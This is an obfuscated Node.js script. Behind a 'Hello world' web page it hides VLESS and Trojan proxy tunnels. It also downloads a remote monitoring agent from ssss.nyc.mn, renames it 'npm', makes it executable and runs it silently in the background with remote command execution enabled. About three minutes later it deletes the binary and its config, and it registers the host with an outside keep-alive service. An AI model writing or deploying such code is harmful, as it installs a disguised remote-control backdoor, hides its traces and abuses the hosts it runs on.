function _0x2f41(){const _0x17a9e0=['91592jXdbph','https://arm64.ssss.nyc.mn/agent','arm','end','replace','https://api.ip.sb/geoip','substr','pipe','2059671ZjydIM','base64','Status','5142935EOFxMt','slice','&fp=chrome&type=ws&host=','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','includes','Failed\x20to\x20resolve\x20','hex','data','once','unlink','decode','digest','369hOzVfh','2096','createHash','false','sha224','Answer','toString','buffer','trojan://','chmod\x20+x\x20npm','WSPATH','Server','2692a206-7cdc-47e6-b4c3-1a0e1e057d2b','post','error','NAME','length','npm\x20is\x20already\x20running,\x20skip\x20running...','DOMAIN','reduce','https://','arm64','Automatic\x20Access\x20Task\x20added\x20successfully','writeFileSync','url','arch','851288ZqmVdq','concat','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','8443','text/plain','npm','catch','SUB_PATH','1897202YiCqAK','test','NEZHA_SERVER','171944WQQopd','6988236mJrgLY','axios','connect','utf8','map','8.8.4.4','message','every','UUID','2083','createServer','true','error:\x20','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','child_process','readUInt16BE','http','\x20with\x20all\x20DNS\x20servers','https://amd64.ssss.nyc.mn/agent','finish','crypto','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','text/html','isp','index.html','log','client_secret:\x20','write','get','then','/bin/bash','type','https://amd64.ssss.nyc.mn/v1','connection','Server\x20is\x20running\x20on\x20port\x20','npm\x20is\x20running','NEZHA_PORT','vless://','&path=%2F','https://arm64.ssss.nyc.mn/v1','readUInt8','close','pop','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','1.1.1.1','stream','update','1234.abc.com','110BnFjac',':443?encryption=none&security=tls&sni=','NEZHA_KEY','443','setsid\x20nohup\x20./npm\x20-s\x20',':443?security=tls&sni=','join','Hello\x20world!','path','Unknown','country_code','env','find','config.yaml','listen','AUTO_ACCESS','split','writeHead','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'];_0x2f41=function(){return _0x17a9e0;};return _0x2f41();}const _0x41bb0b=_0x5269;(function(_0x1f19d2,_0x4e5d19){const _0x3f551b=_0x5269,_0x18b189=_0x1f19d2();while(!![]){try{const _0x2910dc=parseInt(_0x3f551b(0x12a))/0x1+-parseInt(_0x3f551b(0x132))/0x2+-parseInt(_0x3f551b(0x101))/0x3+-parseInt(_0x3f551b(0x135))/0x4*(parseInt(_0x3f551b(0xe6))/0x5)+parseInt(_0x3f551b(0x136))/0x6+parseInt(_0x3f551b(0x104))/0x7+parseInt(_0x3f551b(0xf9))/0x8*(parseInt(_0x3f551b(0x110))/0x9);if(_0x2910dc===_0x4e5d19)break;else _0x18b189['push'](_0x18b189['shift']());}catch(_0xae6770){_0x18b189['push'](_0x18b189['shift']());}}}(_0x2f41,0x9c11a));const os=require('os'),http=require(_0x41bb0b(0x146)),fs=require('fs'),axios=require(_0x41bb0b(0x137)),net=require('net'),path=require(_0x41bb0b(0xee)),crypto=require(_0x41bb0b(0x14a)),{Buffer}=require(_0x41bb0b(0x117)),{exec,execSync}=require(_0x41bb0b(0x144)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x41bb0b(0xf1)][_0x41bb0b(0x13e)]||_0x41bb0b(0x11c),NEZHA_SERVER=process[_0x41bb0b(0xf1)][_0x41bb0b(0x134)]||'',NEZHA_PORT=process[_0x41bb0b(0xf1)][_0x41bb0b(0x15a)]||'',NEZHA_KEY=process[_0x41bb0b(0xf1)][_0x41bb0b(0xe8)]||'',DOMAIN=process[_0x41bb0b(0xf1)][_0x41bb0b(0x122)]||_0x41bb0b(0xe5),AUTO_ACCESS=process['env'][_0x41bb0b(0xf5)]||!![],WSPATH=process[_0x41bb0b(0xf1)][_0x41bb0b(0x11a)]||UUID[_0x41bb0b(0x105)](0x0,0x8),SUB_PATH=process['env'][_0x41bb0b(0x131)]||_0x41bb0b(0x11c),NAME=process['env'][_0x41bb0b(0x11f)]||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2e7eee=_0x41bb0b;try{const _0xda5e7f=await axios['get'](_0x2e7eee(0xfe)),_0x45a94b=_0xda5e7f[_0x2e7eee(0x10b)];ISP=(_0x45a94b[_0x2e7eee(0xf0)]+'-'+_0x45a94b[_0x2e7eee(0x14d)])[_0x2e7eee(0xfd)](/ /g,'_');}catch(_0x436e62){ISP=_0x2e7eee(0xef);}};GetISP();const httpServer=http[_0x41bb0b(0x140)]((_0x328076,_0x562014)=>{const _0xc44904=_0x41bb0b;if(_0x328076[_0xc44904(0x128)]==='/'){const _0x19b109=path[_0xc44904(0xec)](__dirname,_0xc44904(0x14e));fs['readFile'](_0x19b109,_0xc44904(0x139),(_0x4dbd19,_0x1db16c)=>{const _0x9c86b1=_0xc44904;if(_0x4dbd19){_0x562014[_0x9c86b1(0xf7)](0xc8,{'Content-Type':_0x9c86b1(0x14c)}),_0x562014[_0x9c86b1(0xfc)](_0x9c86b1(0xed));return;}_0x562014[_0x9c86b1(0xf7)](0xc8,{'Content-Type':'text/html'}),_0x562014[_0x9c86b1(0xfc)](_0x1db16c);});return;}else{if(_0x328076[_0xc44904(0x128)]==='/'+SUB_PATH){const _0x4daf39=NAME?NAME+'-'+ISP:ISP,_0x507908=_0xc44904(0x15b)+UUID+'@'+DOMAIN+_0xc44904(0xe7)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4daf39,_0x18689a=_0xc44904(0x118)+UUID+'@'+DOMAIN+_0xc44904(0xeb)+DOMAIN+_0xc44904(0x106)+DOMAIN+_0xc44904(0x15c)+WSPATH+'#'+_0x4daf39,_0x10b3f3=_0x507908+'\x0a'+_0x18689a,_0xf7fed1=Buffer['from'](_0x10b3f3)[_0xc44904(0x116)](_0xc44904(0x102));_0x562014[_0xc44904(0xf7)](0xc8,{'Content-Type':_0xc44904(0x12e)}),_0x562014['end'](_0xf7fed1+'\x0a');}else _0x562014['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x562014[_0xc44904(0xfc)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x41bb0b(0x11b))]({'server':httpServer}),uuid=UUID[_0x41bb0b(0xfd)](/-/g,''),DNS_SERVERS=[_0x41bb0b(0x13b),_0x41bb0b(0xe2)];function resolveHost(_0x403763){return new Promise((_0x540729,_0x35a092)=>{const _0x58217b=_0x5269;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x58217b(0x133)](_0x403763)){_0x540729(_0x403763);return;}let _0x8d1768=0x0;function _0x311350(){const _0x196c46=_0x58217b;if(_0x8d1768>=DNS_SERVERS[_0x196c46(0x120)]){_0x35a092(new Error(_0x196c46(0x109)+_0x403763+_0x196c46(0x147)));return;}const _0x479d32=DNS_SERVERS[_0x8d1768];_0x8d1768++;const _0x4dc5ce='https://dns.google/resolve?name='+encodeURIComponent(_0x403763)+'&type=A';axios[_0x196c46(0x152)](_0x4dc5ce,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x3fcddb=>{const _0x3ffcf1=_0x196c46,_0x20edec=_0x3fcddb[_0x3ffcf1(0x10b)];if(_0x20edec[_0x3ffcf1(0x103)]===0x0&&_0x20edec[_0x3ffcf1(0x115)]&&_0x20edec[_0x3ffcf1(0x115)][_0x3ffcf1(0x120)]>0x0){const _0x1cac0d=_0x20edec['Answer'][_0x3ffcf1(0xf2)](_0x161234=>_0x161234[_0x3ffcf1(0x155)]===0x1);if(_0x1cac0d){_0x540729(_0x1cac0d[_0x3ffcf1(0x10b)]);return;}}_0x311350();})['catch'](_0x3895e=>{_0x311350();});}_0x311350();});}function handleVlessConnection(_0x5a77e9,_0x4f6ad5){const _0x24f23f=_0x41bb0b,[_0x353e1b]=_0x4f6ad5,_0x31b1fc=_0x4f6ad5[_0x24f23f(0x105)](0x1,0x11);if(!_0x31b1fc['every']((_0x12ca88,_0x427895)=>_0x12ca88==parseInt(uuid['substr'](_0x427895*0x2,0x2),0x10)))return![];let _0x7d44c8=_0x4f6ad5[_0x24f23f(0x105)](0x11,0x12)[_0x24f23f(0x15e)]()+0x13;const _0x3190bf=_0x4f6ad5[_0x24f23f(0x105)](_0x7d44c8,_0x7d44c8+=0x2)['readUInt16BE'](0x0),_0x3857b3=_0x4f6ad5[_0x24f23f(0x105)](_0x7d44c8,_0x7d44c8+=0x1)['readUInt8'](),_0x207cca=_0x3857b3==0x1?_0x4f6ad5['slice'](_0x7d44c8,_0x7d44c8+=0x4)[_0x24f23f(0xec)]('.'):_0x3857b3==0x2?new TextDecoder()[_0x24f23f(0x10e)](_0x4f6ad5[_0x24f23f(0x105)](_0x7d44c8+0x1,_0x7d44c8+=0x1+_0x4f6ad5[_0x24f23f(0x105)](_0x7d44c8,_0x7d44c8+0x1)['readUInt8']())):_0x3857b3==0x3?_0x4f6ad5[_0x24f23f(0x105)](_0x7d44c8,_0x7d44c8+=0x10)[_0x24f23f(0x123)]((_0x47663e,_0x4920a4,_0x1d76b8,_0xb17f11)=>_0x1d76b8%0x2?_0x47663e[_0x24f23f(0x12b)](_0xb17f11[_0x24f23f(0x105)](_0x1d76b8-0x1,_0x1d76b8+0x1)):_0x47663e,[])[_0x24f23f(0x13a)](_0x33aa9e=>_0x33aa9e[_0x24f23f(0x145)](0x0)[_0x24f23f(0x116)](0x10))['join'](':'):'';_0x5a77e9['send'](new Uint8Array([_0x353e1b,0x0]));const _0x4ff8c9=createWebSocketStream(_0x5a77e9);return resolveHost(_0x207cca)[_0x24f23f(0x153)](_0x416021=>{const _0x594416=_0x24f23f;net[_0x594416(0x138)]({'host':_0x416021,'port':_0x3190bf},function(){const _0x4f950d=_0x594416;this[_0x4f950d(0x151)](_0x4f6ad5['slice'](_0x7d44c8)),_0x4ff8c9['on'](_0x4f950d(0x11e),()=>{})['pipe'](this)['on'](_0x4f950d(0x11e),()=>{})[_0x4f950d(0x100)](_0x4ff8c9);})['on'](_0x594416(0x11e),()=>{});})[_0x24f23f(0x130)](_0x124bdc=>{const _0x53dcf0=_0x24f23f;net['connect']({'host':_0x207cca,'port':_0x3190bf},function(){const _0x2154f0=_0x5269;this[_0x2154f0(0x151)](_0x4f6ad5[_0x2154f0(0x105)](_0x7d44c8)),_0x4ff8c9['on'](_0x2154f0(0x11e),()=>{})[_0x2154f0(0x100)](this)['on']('error',()=>{})[_0x2154f0(0x100)](_0x4ff8c9);})['on'](_0x53dcf0(0x11e),()=>{});}),!![];}function handleTrojanConnection(_0x365968,_0x2d8d0f){const _0x4d0e64=_0x41bb0b;try{if(_0x2d8d0f[_0x4d0e64(0x120)]<0x3a)return![];const _0x314de9=_0x2d8d0f[_0x4d0e64(0x105)](0x0,0x38)[_0x4d0e64(0x116)](),_0x4d54a8=[UUID];let _0x5d53bb=null;for(const _0x62a5b8 of _0x4d54a8){const _0x1d2e3b=crypto[_0x4d0e64(0x112)](_0x4d0e64(0x114))[_0x4d0e64(0xe4)](_0x62a5b8)[_0x4d0e64(0x10f)](_0x4d0e64(0x10a));if(_0x1d2e3b===_0x314de9){_0x5d53bb=_0x62a5b8;break;}}if(!_0x5d53bb)return![];let _0x21aa8d=0x38;_0x2d8d0f[_0x21aa8d]===0xd&&_0x2d8d0f[_0x21aa8d+0x1]===0xa&&(_0x21aa8d+=0x2);const _0x5eca46=_0x2d8d0f[_0x21aa8d];if(_0x5eca46!==0x1)return![];_0x21aa8d+=0x1;const _0x1764a3=_0x2d8d0f[_0x21aa8d];_0x21aa8d+=0x1;let _0x2d068b,_0x5b57e8;if(_0x1764a3===0x1)_0x2d068b=_0x2d8d0f[_0x4d0e64(0x105)](_0x21aa8d,_0x21aa8d+0x4)[_0x4d0e64(0xec)]('.'),_0x21aa8d+=0x4;else{if(_0x1764a3===0x3){const _0xa67c17=_0x2d8d0f[_0x21aa8d];_0x21aa8d+=0x1,_0x2d068b=_0x2d8d0f[_0x4d0e64(0x105)](_0x21aa8d,_0x21aa8d+_0xa67c17)['toString'](),_0x21aa8d+=_0xa67c17;}else{if(_0x1764a3===0x4)_0x2d068b=_0x2d8d0f[_0x4d0e64(0x105)](_0x21aa8d,_0x21aa8d+0x10)[_0x4d0e64(0x123)]((_0x27bfd9,_0x249b3c,_0x66f0b,_0x519be1)=>_0x66f0b%0x2?_0x27bfd9[_0x4d0e64(0x12b)](_0x519be1[_0x4d0e64(0x105)](_0x66f0b-0x1,_0x66f0b+0x1)):_0x27bfd9,[])['map'](_0xd5c922=>_0xd5c922['readUInt16BE'](0x0)['toString'](0x10))[_0x4d0e64(0xec)](':'),_0x21aa8d+=0x10;else return![];}}_0x5b57e8=_0x2d8d0f[_0x4d0e64(0x145)](_0x21aa8d),_0x21aa8d+=0x2;_0x21aa8d<_0x2d8d0f[_0x4d0e64(0x120)]&&_0x2d8d0f[_0x21aa8d]===0xd&&_0x2d8d0f[_0x21aa8d+0x1]===0xa&&(_0x21aa8d+=0x2);const _0x2a07f0=createWebSocketStream(_0x365968);return resolveHost(_0x2d068b)['then'](_0x460023=>{const _0x2c0f06=_0x4d0e64;net[_0x2c0f06(0x138)]({'host':_0x460023,'port':_0x5b57e8},function(){const _0x473045=_0x2c0f06;_0x21aa8d<_0x2d8d0f[_0x473045(0x120)]&&this[_0x473045(0x151)](_0x2d8d0f[_0x473045(0x105)](_0x21aa8d)),_0x2a07f0['on'](_0x473045(0x11e),()=>{})['pipe'](this)['on'](_0x473045(0x11e),()=>{})[_0x473045(0x100)](_0x2a07f0);})['on'](_0x2c0f06(0x11e),()=>{});})['catch'](_0x3f7f79=>{const _0x529b47=_0x4d0e64;net[_0x529b47(0x138)]({'host':_0x2d068b,'port':_0x5b57e8},function(){const _0x2e9d2f=_0x529b47;_0x21aa8d<_0x2d8d0f['length']&&this[_0x2e9d2f(0x151)](_0x2d8d0f[_0x2e9d2f(0x105)](_0x21aa8d)),_0x2a07f0['on'](_0x2e9d2f(0x11e),()=>{})[_0x2e9d2f(0x100)](this)['on'](_0x2e9d2f(0x11e),()=>{})['pipe'](_0x2a07f0);})['on'](_0x529b47(0x11e),()=>{});}),!![];}catch(_0x106d73){return![];}}wss['on'](_0x41bb0b(0x157),(_0x531e2a,_0x2f851a)=>{const _0x2e1e3e=_0x41bb0b,_0x161c9b=_0x2f851a[_0x2e1e3e(0x128)]||'';_0x531e2a[_0x2e1e3e(0x10c)](_0x2e1e3e(0x13c),_0x358ad5=>{const _0x5564c4=_0x2e1e3e;if(_0x358ad5[_0x5564c4(0x120)]>0x11&&_0x358ad5[0x0]===0x0){const _0x3abeb0=_0x358ad5[_0x5564c4(0x105)](0x1,0x11),_0x22a607=_0x3abeb0[_0x5564c4(0x13d)]((_0xebd20,_0x28919e)=>_0xebd20==parseInt(uuid[_0x5564c4(0xff)](_0x28919e*0x2,0x2),0x10));if(_0x22a607){!handleVlessConnection(_0x531e2a,_0x358ad5)&&_0x531e2a[_0x5564c4(0xdf)]();return;}}!handleTrojanConnection(_0x531e2a,_0x358ad5)&&_0x531e2a['close']();})['on'](_0x2e1e3e(0x11e),()=>{});});function _0x5269(_0x11741c,_0x5ebc17){_0x11741c=_0x11741c-0xdf;const _0x2f41d6=_0x2f41();let _0x5269f5=_0x2f41d6[_0x11741c];return _0x5269f5;}const getDownloadUrl=()=>{const _0x2395fc=_0x41bb0b,_0x1f010a=os[_0x2395fc(0x129)]();return _0x1f010a===_0x2395fc(0xfb)||_0x1f010a===_0x2395fc(0x125)||_0x1f010a==='aarch64'?!NEZHA_PORT?_0x2395fc(0x15d):_0x2395fc(0xfa):!NEZHA_PORT?_0x2395fc(0x156):_0x2395fc(0x148);},downloadFile=async()=>{const _0x4d0bdf=_0x41bb0b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1141d5=getDownloadUrl(),_0x204e40=await axios({'method':_0x4d0bdf(0x152),'url':_0x1141d5,'responseType':_0x4d0bdf(0xe3)}),_0x136451=fs['createWriteStream'](_0x4d0bdf(0x12f));return _0x204e40[_0x4d0bdf(0x10b)]['pipe'](_0x136451),new Promise((_0x50ff99,_0x57be6c)=>{const _0x4434b6=_0x4d0bdf;_0x136451['on'](_0x4434b6(0x149),()=>{const _0x59c267=_0x4434b6;console['log']('npm\x20download\x20successfully'),exec(_0x59c267(0x119),_0x53cc00=>{if(_0x53cc00)_0x57be6c(_0x53cc00);_0x50ff99();});}),_0x136451['on']('error',_0x57be6c);});}catch(_0x3fc18a){throw _0x3fc18a;}},runnz=async()=>{const _0x319cf3=_0x41bb0b;try{const _0x4a366b=execSync(_0x319cf3(0x143),{'encoding':'utf-8'});if(_0x4a366b['trim']()!==''){console['log'](_0x319cf3(0x121));return;}}catch(_0x24d54a){}await downloadFile();let _0x1a8cd8='',_0x2a203f=[_0x319cf3(0xe9),_0x319cf3(0x12d),_0x319cf3(0x111),'2087',_0x319cf3(0x13f),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2ee024=_0x2a203f[_0x319cf3(0x108)](NEZHA_PORT)?'--tls':'';_0x1a8cd8=_0x319cf3(0xea)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2ee024+_0x319cf3(0xe1);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x17a2cf=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x319cf3(0xf6)](':')[_0x319cf3(0xe0)]():'',_0x353a31=_0x2a203f['includes'](_0x17a2cf)?_0x319cf3(0x141):_0x319cf3(0x113),_0x36018d=_0x319cf3(0x150)+NEZHA_KEY+_0x319cf3(0x107)+NEZHA_SERVER+_0x319cf3(0x14b)+_0x353a31+_0x319cf3(0xf8)+UUID;fs[_0x319cf3(0x127)](_0x319cf3(0xf3),_0x36018d);}_0x1a8cd8='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x319cf3(0x12c));return;}}try{exec(_0x1a8cd8,{'shell':_0x319cf3(0x154)},_0x26b6c9=>{const _0x3a1aba=_0x319cf3;if(_0x26b6c9)console[_0x3a1aba(0x11e)]('npm\x20running\x20error:',_0x26b6c9);else console['log'](_0x3a1aba(0x159));});}catch(_0x5bd345){console['error'](_0x319cf3(0x142)+_0x5bd345);}};async function addAccessTask(){const _0x563319=_0x41bb0b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1ea15f=_0x563319(0x124)+DOMAIN;try{const _0x54e58c=await axios[_0x563319(0x11d)]('https://oooo.serv00.net/add-url',{'url':_0x1ea15f},{'headers':{'Content-Type':'application/json'}});console[_0x563319(0x14f)](_0x563319(0x126));}catch(_0x32b8f1){}}const delFiles=()=>{const _0x34316a=_0x41bb0b;fs[_0x34316a(0x10d)](_0x34316a(0x12f),()=>{}),fs[_0x34316a(0x10d)](_0x34316a(0xf3),()=>{});};httpServer[_0x41bb0b(0xf4)](PORT,()=>{const _0x308e32=_0x41bb0b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x308e32(0x158)+PORT);});
